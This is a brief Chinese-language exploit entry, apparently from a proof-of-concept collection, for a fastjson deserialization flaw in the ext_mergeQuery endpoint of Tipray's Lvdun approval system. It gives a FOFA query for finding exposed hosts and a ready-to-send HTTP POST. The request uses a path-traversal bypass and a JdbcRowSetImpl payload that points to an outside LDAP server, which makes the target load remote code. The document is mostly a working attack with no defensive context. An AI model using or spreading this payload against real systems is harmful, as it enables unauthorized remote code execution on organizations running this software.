# 天锐绿盾审批系统ext_mergeQuery存在fastjson反序列化

## fofa
```javascript
app="TIPPAY-绿盾审批系统"
```

## poc
```javascript
POST /trwfe/login.jsp/.%2e/rest/ext/mergeQuery HTTP/1.1
Host: 
X-Authorization: dir
Content-Type: application/json

[
    {
        "requestType": "trusteeMsg",
        "requestBody": {
            "userId": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "ldap://192.168.168.11:50389/165c51",
                "autoCommit": true
            },
            "createTime": "2026-01-01"
        }
    }
]
```
